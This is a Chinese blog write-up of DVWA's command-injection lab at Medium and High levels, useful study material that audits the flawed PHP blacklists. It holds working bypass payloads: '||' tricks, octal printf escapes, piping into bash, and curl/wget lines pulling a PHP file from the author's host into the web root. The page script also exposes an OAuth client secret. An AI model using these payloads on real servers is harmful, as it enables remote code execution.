<p><img src=/blog/p/get-start-dvwa-02/image-20220422140459588-16506075001861.png width=1248 height=366 srcset="/blog/p/get-start-dvwa-02/image-20220422140459588-16506075001861_hu3476fd340cc0dbca84661fbd196275c9_38452_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-02/image-20220422140459588-16506075001861_hu3476fd340cc0dbca84661fbd196275c9_38452_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220422140459588 class=gallery-image data-flex-grow=340 data-flex-basis=818px></p>
<h3 id=提高难度medium>提高难度：Medium</h3>
<p>在 Medium 难度下 直接注入 <code>localhost && echo 123</code> 会发现没有 <code>123</code> 回显了，日志里出现 <code>ping: unknown host</code> 的错误，初步怀疑是对 <code>&&</code> 做了过滤。</p>
<p>DVWA 是个白盒，我也不用瞎试，直接点开 view source 审计下代码。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>

<span class=k>if</span><span class=p>(</span> <span class=nx>isset</span><span class=p>(</span> <span class=nv>$_POST</span><span class=p>[</span> <span class=s1>&#39;Submit&#39;</span> <span class=p>]</span>  <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>
    <span class=c1>// Get input
</span><span class=c1></span>    <span class=nv>$target</span> <span class=o>=</span> <span class=nv>$_REQUEST</span><span class=p>[</span> <span class=s1>&#39;ip&#39;</span> <span class=p>];</span>

    <span class=c1>// Set blacklist
</span><span class=c1></span>    <span class=nv>$substitutions</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span>
        <span class=s1>&#39;&amp;&amp;&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
        <span class=s1>&#39;;&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
    <span class=p>);</span>

    <span class=c1>// Remove any of the charactars in the array (blacklist).
</span><span class=c1></span>    <span class=nv>$target</span> <span class=o>=</span> <span class=nx>str_replace</span><span class=p>(</span> <span class=nx>array_keys</span><span class=p>(</span> <span class=nv>$substitutions</span> <span class=p>),</span> <span class=nv>$substitutions</span><span class=p>,</span> <span class=nv>$target</span> <span class=p>);</span>

    <span class=c1>// Determine OS and execute the ping command.
</span><span class=c1></span>    <span class=k>if</span><span class=p>(</span> <span class=nx>stristr</span><span class=p>(</span> <span class=nx>php_uname</span><span class=p>(</span> <span class=s1>&#39;s&#39;</span> <span class=p>),</span> <span class=s1>&#39;Windows NT&#39;</span> <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>
        <span class=c1>// Windows
</span><span class=c1></span>        <span class=nv>$cmd</span> <span class=o>=</span> <span class=nx>shell_exec</span><span class=p>(</span> <span class=s1>&#39;ping  &#39;</span> <span class=o>.</span> <span class=nv>$target</span> <span class=p>);</span>
    <span class=p>}</span>
    <span class=k>else</span> <span class=p>{</span>
        <span class=c1>// *nix
</span><span class=c1></span>        <span class=nv>$cmd</span> <span class=o>=</span> <span class=nx>shell_exec</span><span class=p>(</span> <span class=s1>&#39;ping  -c 4 &#39;</span> <span class=o>.</span> <span class=nv>$target</span> <span class=p>);</span>
    <span class=p>}</span>

    <span class=c1>// Feedback for the end user
</span><span class=c1></span>    <span class=k>echo</span> <span class=s2>&#34;&lt;pre&gt;</span><span class=si>{</span><span class=nv>$cmd</span><span class=si>}</span><span class=s2>&lt;/pre&gt;&#34;</span><span class=p>;</span>
<span class=p>}</span>

<span class=cp>?&gt;</span><span class=err>
</span></code></pre></div><p>注意到把 <code>&&</code> 和 <code>;</code> 去除了，但这个过滤显然是不完善的。起码我一下子就能想到还可以<code>||</code>或者<code>|</code>，还有<code>$()</code>之类的方式。</p>
<p>把先前的 payload 改成 <code>notexists || echo 123</code> 再提交。</p>
<p><img src=/blog/p/get-start-dvwa-02/image-20220422153010236.png width=674 height=140 srcset="/blog/p/get-start-dvwa-02/image-20220422153010236_hu4c2f178bd8960d6bc4449f63040b6b19_5338_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-02/image-20220422153010236_hu4c2f178bd8960d6bc4449f63040b6b19_5338_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220422153010236 class=gallery-image data-flex-grow=481 data-flex-basis=1155px></p>
<p>可以看到 <code>echo 123</code> 已经被执行了，剩下的就是 get shell 了。</p>
<h3 id=提高难度high>提高难度：High</h3>
<p>High 难度下用 Medium 难度的 Payload 也能直接 bypass，有点意外。虽然已经过了，但还是再审计下 High 难度下的代码，看看和 Medium 难度有什么不同。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>

<span class=k>if</span><span class=p>(</span> <span class=nx>isset</span><span class=p>(</span> <span class=nv>$_POST</span><span class=p>[</span> <span class=s1>&#39;Submit&#39;</span> <span class=p>]</span>  <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>
    <span class=c1>// Get input
</span><span class=c1></span>    <span class=nv>$target</span> <span class=o>=</span> <span class=nx>trim</span><span class=p>(</span><span class=nv>$_REQUEST</span><span class=p>[</span> <span class=s1>&#39;ip&#39;</span> <span class=p>]);</span>

    <span class=c1>// Set blacklist
</span><span class=c1></span>    <span class=nv>$substitutions</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span>
        <span class=s1>&#39;&amp;&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
        <span class=s1>&#39;;&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
        <span class=s1>&#39;| &#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
        <span class=s1>&#39;-&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
        <span class=s1>&#39;$&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
        <span class=s1>&#39;(&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
        <span class=s1>&#39;)&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
        <span class=s1>&#39;`&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
        <span class=s1>&#39;||&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
    <span class=p>);</span>

    <span class=c1>// Remove any of the charactars in the array (blacklist).
</span><span class=c1></span>    <span class=nv>$target</span> <span class=o>=</span> <span class=nx>str_replace</span><span class=p>(</span> <span class=nx>array_keys</span><span class=p>(</span> <span class=nv>$substitutions</span> <span class=p>),</span> <span class=nv>$substitutions</span><span class=p>,</span> <span class=nv>$target</span> <span class=p>);</span>

    <span class=c1>// Determine OS and execute the ping command.
</span><span class=c1></span>    <span class=k>if</span><span class=p>(</span> <span class=nx>stristr</span><span class=p>(</span> <span class=nx>php_uname</span><span class=p>(</span> <span class=s1>&#39;s&#39;</span> <span class=p>),</span> <span class=s1>&#39;Windows NT&#39;</span> <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>
        <span class=c1>// Windows
</span><span class=c1></span>        <span class=nv>$cmd</span> <span class=o>=</span> <span class=nx>shell_exec</span><span class=p>(</span> <span class=s1>&#39;ping  &#39;</span> <span class=o>.</span> <span class=nv>$target</span> <span class=p>);</span>
    <span class=p>}</span>
    <span class=k>else</span> <span class=p>{</span>
        <span class=c1>// *nix
</span><span class=c1></span>        <span class=nv>$cmd</span> <span class=o>=</span> <span class=nx>shell_exec</span><span class=p>(</span> <span class=s1>&#39;ping  -c 4 &#39;</span> <span class=o>.</span> <span class=nv>$target</span> <span class=p>);</span>
    <span class=p>}</span>

    <span class=c1>// Feedback for the end user
</span><span class=c1></span>    <span class=k>echo</span> <span class=s2>&#34;&lt;pre&gt;</span><span class=si>{</span><span class=nv>$cmd</span><span class=si>}</span><span class=s2>&lt;/pre&gt;&#34;</span><span class=p>;</span>
<span class=p>}</span>

<span class=cp>?&gt;</span><span class=err>
</span></code></pre></div><p>王德发？</p>
<p>这不是已经滤掉了 <code>||</code> 吗，为什么 <code>notexists || echo 123</code> 这个 payload 还是显示了 <code>123</code>？</p>
<p><img src=/blog/p/get-start-dvwa-02/image-20220422153514135.png width=888 height=660 srcset="/blog/p/get-start-dvwa-02/image-20220422153514135_hu6b2ed04736f2e8efc9ef7677bd7cca8b_48230_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-02/image-20220422153514135_hu6b2ed04736f2e8efc9ef7677bd7cca8b_48230_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220422153514135 class=gallery-image data-flex-grow=134 data-flex-basis=322px></p>
<p>我不理解，大受震撼。干脆开了个 php 解释器试一试 <code>str_replace</code> 到底替换出来个什么鬼。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>
    <span class=c1>// Get input
</span><span class=c1></span>    <span class=nv>$target</span> <span class=o>=</span> <span class=s1>&#39;notexists || echo 123&#39;</span><span class=p>;</span>

    <span class=c1>// Set blacklist
</span><span class=c1></span>    <span class=nv>$substitutions</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span>
        <span class=s1>&#39;&amp;&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
        <span class=s1>&#39;;&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
        <span class=s1>&#39;| &#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
        <span class=s1>&#39;-&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
        <span class=s1>&#39;$&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
        <span class=s1>&#39;(&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
        <span class=s1>&#39;)&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
        <span class=s1>&#39;`&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
        <span class=s1>&#39;||&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
    <span class=p>);</span>

    <span class=c1>// Remove any of the charactars in the array (blacklist).
</span><span class=c1></span>    <span class=nv>$target</span> <span class=o>=</span> <span class=nx>str_replace</span><span class=p>(</span> <span class=nx>array_keys</span><span class=p>(</span> <span class=nv>$substitutions</span> <span class=p>),</span> <span class=nv>$substitutions</span><span class=p>,</span> <span class=nv>$target</span> <span class=p>);</span>

    <span class=k>echo</span> <span class=s1>&#39;ping -c 4 &#39;</span> <span class=o>.</span> <span class=nv>$target</span>
<span class=cp>?&gt;</span><span class=err>
</span></code></pre></div><p>结果是<code>ping -c 4 notexists |echo 123</code>。看起来是 <code>str_replace</code> 的用法有误，导致实际替换掉的是 <code>|</code> 而不是 <code>||</code>。</p>
<p>php 官方文档（8.1）如是说：</p>
<blockquote>
<p>If <code>search</code> and <code>replace</code> are arrays, then <strong>str_replace()</strong> takes a value from each array and uses them to search and replace on <code>subject</code>. If <code>replace</code> has fewer values than <code>search</code>, then an empty string is used for the rest of replacement values. If <code>search</code> is an array and <code>replace</code> is a string, then this replacement string is used for every value of <code>search</code>. The converse would not make sense, though.</p>
</blockquote>
<p>DVWA 容器的 PHP 版本是 7.0 ，姑且当没变。那问题就在于 <code>str_replace</code> 的替换方法了，我猜&mldr;&mldr;当 <code>search</code> 是 <code>array</code> 的时候，<code>str_replace</code> 实际是这样干的：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class=k>for</span> <span class=nx>_</span><span class=p>,</span> <span class=nx>pattern</span> <span class=o>:=</span> <span class=k>range</span> <span class=nx>search</span> <span class=p>{</span>
    <span class=nx>subject</span> <span class=p>=</span> <span class=nf>replace</span><span class=p>(</span><span class=nx>pattern</span><span class=p>,</span> <span class=nx>subject</span><span class=p>)</span>
<span class=p>}</span>
</code></pre></div><p>简单实验验证下。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>
<span class=k>echo</span> <span class=nx>str_replace</span><span class=p>(</span><span class=k>array</span><span class=p>(</span><span class=s2>&#34;a&#34;</span><span class=p>,</span><span class=s2>&#34;ab&#34;</span><span class=p>),</span><span class=s2>&#34;c&#34;</span><span class=p>,</span><span class=s2>&#34;aabbcc&#34;</span><span class=p>);</span> <span class=c1>// ccbbcc
</span></code></pre></div><p>但即使如此，也应该替换掉 <code>||</code> 两个字符才对啊&mldr;</p>
<p>最后才发现，替换的模式是 <code>| </code>（在<code>|</code>后面多一个空格），所以只替换掉了 <code>|| </code>的后一个 <code>| </code>&mldr;&mldr;</p>
<p>事实证明视力还是很重要的，少打sc2，没瞎早该看到了。</p>
<p>据此可以再改一改 payload，已知 <code>||</code>会被替换成 <code>|</code>，管道运算符会把上一个命令的输出接到下一个命令的 stdin 输入。正好，<code>echo</code> 不读 stdin，直接<code>echo '&lt;?php phpinfo(); ?>' > /var/www/html/1.php</code> 的方法应该不受影响。</p>
<p><img src=/blog/p/get-start-dvwa-02/image-20220422160740919.png width=448 height=143 srcset="/blog/p/get-start-dvwa-02/image-20220422160740919_hu5b9f61819af5c6eaa13b971071838e17_5816_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-02/image-20220422160740919_hu5b9f61819af5c6eaa13b971071838e17_5816_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220422160740919 class=gallery-image data-flex-grow=313 data-flex-basis=751px></p>
<p>倒是没报 404，可是白屏了。从 DVWA 的日志观察到下面的记录：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext>[Fri Apr 22 08:07:20.601596 2022] [:error] [pid 312] [client 10.0.2.2:51105] PHP Notice:  Use of undefined constant phpinfo - assumed &#39;phpinfo&#39; in /var/www/html/2.php on line 1
</code></pre></div><p>这倒是很新鲜，<code>phpinfo</code>不应该是全局的吗？</p>
<blockquote>
<p>我又傻逼了。</p>
</blockquote>
<p>经过十几分钟的脑残式思考，忽然意识到 <code>(</code> 和 <code>)</code> 也在过滤清单里，哦淦！好吧，直接在这里注入 php 代码看来限制有点太多了，插个<code>curl</code>命令让它下载得了。</p>
<p>本地用 <code>python3 -m http.server</code>命令启动一个 http 服务器，然后 <code>ip addr show docker0</code> 看一眼本机 ip，把 payload 改成 <code>notexists || curl http://172.17.0.1:8000/2.php -O /var/www/html/2.php</code> ，先找个 playground 试一试过滤后的命令是什么样。</p>
<p><code>ping -c 4 notexists |curl http://172.17.0.1:8000/2.php O /var/www/html/2.php</code></p>
<p>发现 <code>-</code> 也被过滤了，<code>-O</code>参数不能用。想到看看 php 默认运行目录是哪里，直接 <code>wget</code> 下载到当前目录也可以。然后又想到可以再拼一个 <code>|| mv 2.php /var/www/html/2.php</code> 移动过去。再试一试。</p>
<p><code>ping -c 4 notexists |wget http://172.17.0.1:8000/2.php |mv 2.php /var/www/html/2.php</code></p>
<p>现在看起来有机会运行了，结果报错<code>wget: not found</code>。</p>
<p>行吧。乖乖<code>curl</code>，payload 改成 <code>notexists || curl http://172.17.0.1:8000/2.php || tee /var/www/html/2.php</code>。更屑的事情发生了：<code>curl: not found</code>。</p>
<p>怎么什么都没有？沃日。拼一句 <code>|| ls /usr/bin</code>看看有啥可以用的，惊喜地发现居然有个 <code>rsync</code>，这下总该省事了吧，结果半天没搞出来匿名访问的 rsync daemon。</p>
<p>一看时间快下班了，突然意识到其实有 <code>base64</code> 可以用=。=，还有<code>printf</code>转义<code>\x</code> 都能bypass。怎么一到下班时间就才思泉涌。</p>
<p>payload 改成 <code>notexists || printf '&lt;?php phpinfo\x28\x29\x3b ?>' > /var/www/html/2.php</code>，结果发现依然不行。为什么？头都要炸了。<code>base64 -d</code>的<code>-</code>会被过滤故不能考虑，<code>printf</code>的<code>\x</code>转义序列怎么会不行，谷歌了一番<a class=link href=https://stackoverflow.com/questions/66844155/bin-sh-does-not-recognize-hexadecimal-escape-sequences target=_blank rel=noopener>在爆栈看到个回答</a>：</p>
<blockquote>
<p>Because escape sequences in <code>\xdd</code> form (where each <code>d</code> represents a hexadecimal digit) are a GNU extension and not available everywhere. But octals are widely supported (and <a class=link href=https://pubs.opengroup.org/onlinepubs/9699919799/utilities/printf.html#tag_05 target=_blank rel=noopener>standardized</a>), so you can use:</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=nb>printf</span> <span class=s1>&#39;%b&#39;</span> <span class=s1>&#39;\0220&#39;</span>
</code></pre></div></blockquote>
<p>好嘛，所以说 <code>\x</code> 转义序列还不够 portable 是吧。<code>\0</code>转义序列要用 8 进制编码，于是我再次改了一下 payload &mldr;</p>
<p><code>notexists|printf '&lt;?php phpinfo\050\051\073 ?>' > /var/www/html/2.php</code>，把 <code>\x</code> 转义序列改成了 <code>\0</code>，这次没问题了。</p>
<p><img src=/blog/p/get-start-dvwa-02/image-20220424142807468.png width=1268 height=373 srcset="/blog/p/get-start-dvwa-02/image-20220424142807468_hu3e708c4ffaea9e97136cc32ff74411e9_40468_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-02/image-20220424142807468_hu3e708c4ffaea9e97136cc32ff74411e9_40468_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220424142807468 class=gallery-image data-flex-grow=339 data-flex-basis=815px></p>
<p>此外还想到另一种解法，考虑<code>sh</code>（<code>csh</code>或者<code>dash</code>，<code>ash</code>？）不吃<code>\x</code>，要是对<code>\0</code>也不吃还有种比较狗的办法，<code>printf "printf \"\\x28\\x29\""|bash</code>，用<code>\\</code>转义留下反斜杠，然后传给<code>bash</code>执行。<code>bash</code>大概率是能吃下<code>\x</code>转义序列的，于是就间接实现了<code>printf \x28\x29</code>。</p>
<p>传<code>notexists|printf "printf \"\\x28\""|bash</code>这个 payload 可以看到回显 <code>(</code>，说明这个思路是 ok 的。</p>
<p><img src=/blog/p/get-start-dvwa-02/image-20220424143511245.png width=479 height=121 srcset="/blog/p/get-start-dvwa-02/image-20220424143511245_hu44e5cd97c663482ba2f8b28582fad915_4810_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-02/image-20220424143511245_hu44e5cd97c663482ba2f8b28582fad915_4810_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220424143511245 class=gallery-image data-flex-grow=395 data-flex-basis=950px></p>
<h2 id=总结>总结</h2>
<p>Brute Force 比较简单，不提。</p>
<p>Command Injection 其实一直到 High 难度都还是比较简单的，High 难度下留了<code>|</code>管道符可以用，整个注入就没啥难度了。</p>
<p>这就让我想到了怎么写 <code>ping</code> 这个案例才能做到杜绝命令注入？</p>
<p><code>\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}</code>正则匹配一下，感觉上面玩的那些花样就毫无意义了。</p>
<p>Impossible 难度下 Command Injection 变成了这样</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php>    <span class=c1>// Get input
</span><span class=c1></span>    <span class=nv>$target</span> <span class=o>=</span> <span class=nv>$_REQUEST</span><span class=p>[</span> <span class=s1>&#39;ip&#39;</span> <span class=p>];</span>
    <span class=nv>$target</span> <span class=o>=</span> <span class=nx>stripslashes</span><span class=p>(</span> <span class=nv>$target</span> <span class=p>);</span>

    <span class=c1>// Split the IP into 4 octects
</span><span class=c1></span>    <span class=nv>$octet</span> <span class=o>=</span> <span class=nx>explode</span><span class=p>(</span> <span class=s2>&#34;.&#34;</span><span class=p>,</span> <span class=nv>$target</span> <span class=p>);</span>

    <span class=c1>// Check IF each octet is an integer
</span><span class=c1></span>    <span class=k>if</span><span class=p>(</span> <span class=p>(</span> <span class=nx>is_numeric</span><span class=p>(</span> <span class=nv>$octet</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=p>)</span> <span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=p>(</span> <span class=nx>is_numeric</span><span class=p>(</span> <span class=nv>$octet</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=p>)</span> <span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=p>(</span> <span class=nx>is_numeric</span><span class=p>(</span> <span class=nv>$octet</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=p>)</span> <span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=p>(</span> <span class=nx>is_numeric</span><span class=p>(</span> <span class=nv>$octet</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=p>)</span> <span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=p>(</span> <span class=nx>sizeof</span><span class=p>(</span> <span class=nv>$octet</span> <span class=p>)</span> <span class=o>==</span> <span class=mi>4</span> <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>
        <span class=c1>// If all 4 octets are int&#39;s put the IP back together.
</span><span class=c1></span>        <span class=nv>$target</span> <span class=o>=</span> <span class=nv>$octet</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>.</span> <span class=s1>&#39;.&#39;</span> <span class=o>.</span> <span class=nv>$octet</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>.</span> <span class=s1>&#39;.&#39;</span> <span class=o>.</span> <span class=nv>$octet</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>.</span> <span class=s1>&#39;.&#39;</span> <span class=o>.</span> <span class=nv>$octet</span><span class=p>[</span><span class=mi>3</span><span class=p>];</span>
<span class=c1>//...
</span></code></pre></div><p>我是有点难理解为什么还是用这种比较糙的手段验证=。=正则匹配下不行吗？<code>is_numeric</code>是不是能 bypass 我不太肯定，但这条长长的<code>if</code>看起来就感觉是有坑的样子&mldr;</p>
<p>所以吧&mldr;到底多少还有点迷惑。Impossible 难度的命令注入，未来再研究研究，也许之后会再写篇博客看看。</p>
</section>
<footer class=article-footer>
<section class=article-tags>
<a href=/blog/tags/security/>security</a>
<a href=/blog/tags/dvwa/>dvwa</a>
</section>
<section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span>
</section>
</footer>
<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css integrity=sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn crossorigin=anonymous><script src=https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js integrity=sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8 crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js integrity=sha384-vZTG03m+2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl crossorigin=anonymous defer></script><script>window.addEventListener("DOMContentLoaded",()=>{renderMathInElement(document.querySelector(`.article-content`),{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}]})})</script>
</article>
<aside class=related-contents--wrapper>
<h2 class=section-title>相关文章</h2>
<div class=related-contents>
<div class="flex article-list--tile">
<article>
<a href=/blog/p/get-start-dvwa-05/>
<div class=article-details>
<h2 class=article-title>DVWA上手记录-文件上传</h2>
</div>
</a>
</article>
<article>
<a href=/blog/p/get-start-dvwa-04/>
<div class=article-details>
<h2 class=article-title>DVWA上手记录-文件包含</h2>
</div>
</a>
</article>
<article>
<a href=/blog/p/get-start-dvwa-03/>
<div class=article-details>
<h2 class=article-title>DVWA上手记录-CSRF</h2>
</div>
</a>
</article>
<article>
<a href=/blog/p/get-start-dvwa-01/>
<div class=article-details>
<h2 class=article-title>DVWA上手记录-初体验</h2>
</div>
</a>
</article>
<article>
<a href=/blog/p/get-start-dvwa-13/>
<div class=article-details>
<h2 class=article-title>DVWA上手记录-JavaScript</h2>
</div>
</a>
</article>
</div>
</div>
</aside>
<link rel=stylesheet href=https://unpkg.com/vssue/dist/vssue.min.css>
<div id=vssue></div>
<script src=https://unpkg.com/vue@2.6.14/dist/vue.runtime.min.js></script>
<script src=https://unpkg.com/vssue@1.4.8/dist/vssue.github.min.js></script>
<script>new Vue({el:"#vssue",render:a=>a("Vssue",{props:{title:"DVWA上手记录-简单尝试",options:{autoCreateIssue:!1,owner:"nnnewb",repo:"blog",clientId:"285910fdc1567a1a23e3",clientSecret:"f00da5438d9ac82c4a86024866c7a916ae411edc"}}})})</script>
<footer class=site-footer>
<section class=copyright>
&copy;
2021 -
2022 weakptr's 笔记
</section>
<section class=powerby>
GitHub Pages <br>
Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> <br>
Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.10.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a>
</section>
</footer>
<div class=pswp tabindex=-1 role=dialog aria-hidden=true>
<div class=pswp__bg></div>
<div class=pswp__scroll-wrap>
<div class=pswp__container>
<div class=pswp__item></div>
<div class=pswp__item></div>
<div class=pswp__item></div>
</div>
<div class="pswp__ui pswp__ui--hidden">
<div class=pswp__top-bar>
<div class=pswp__counter></div>
<button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
<div class=pswp__preloader>
<div class=pswp__preloader__icn>
<div class=pswp__preloader__cut>
<div class=pswp__preloader__donut></div>
</div>
</div>
</div>
</div>
<div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
<div class=pswp__share-tooltip></div>
</div>
<button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
</button>
<div class=pswp__caption>
<div class=pswp__caption__center></div>
</div>
</div>
</div>
</div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css integrity="sha256-c0uckgykQ9v5k+IqViZOZKc47Jn7KQil4/MP3ySA3F8=" crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE=" crossorigin=anonymous>
</main>
<aside class="sidebar right-sidebar sticky">
<section class="widget archives">
<div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg>
</div>
<h2 class="widget-title section-title">目录</h2>
<div class=widget--toc>
<nav id=TableOfContents>
<ol>
<li><a href=#前言>前言</a></li>
<li><a href=#brute-force>Brute Force</a>
<ol>
<li><a href=#信息收集>信息收集</a></li>
<li><a href=#准备>准备</a></li>
<li><a href=#编写脚本>编写脚本</a></li>
<li><a href=#提高难度>提高难度</a></li>
</ol>
</li>
<li><a href=#command-injection>Command Injection</a>
<ol>
<li><a href=#信息收集-1>信息收集</a></li>
<li><a href=#准备-1>准备</a></li>
<li><a href=#构造-payload>构造 payload</a></li>
<li><a href=#提高难度medium>提高难度：Medium</a></li>
<li><a href=#提高难度high>提高难度：High</a></li>
</ol>
</li>
<li><a href=#总结>总结</a></li>
</ol>
</nav>
</div>
</section>
</aside>
</div>
<script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g=" crossorigin=anonymous></script><script type=text/javascript src=/blog/ts/main.js defer></script>
<script>(function(){const a=document.createElement('link');a.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",a.type="text/css",a.rel="stylesheet",document.head.appendChild(a)})()</script>
</body>
</html>